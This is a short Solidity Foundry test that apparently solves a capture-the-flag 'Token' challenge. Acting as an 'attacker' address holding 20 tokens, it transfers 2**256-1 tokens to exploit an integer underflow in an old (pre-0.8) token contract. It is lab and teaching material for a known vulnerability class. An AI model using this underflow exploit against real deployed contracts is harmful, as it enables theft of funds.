// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/Token.sol";

contract TokenTest is Test{
    function setUp() public {
    }

    function testToken() public {
        Token token = new Token(1000000);
        address attacker = address(0x123);
        address attacker1 = address(0x456);
        token.transfer(attacker, 20);
        uint256 balance = token.balanceOf(attacker);
        console.log("balance: %s", balance);
        uint256 maxVal = 2**256 - 1;
        vm.startPrank(attacker);
        token.transfer(attacker1, maxVal);
        vm.stopPrank();
        balance = token.balanceOf(attacker1);
        console.log("balance: %s", balance);
    }
}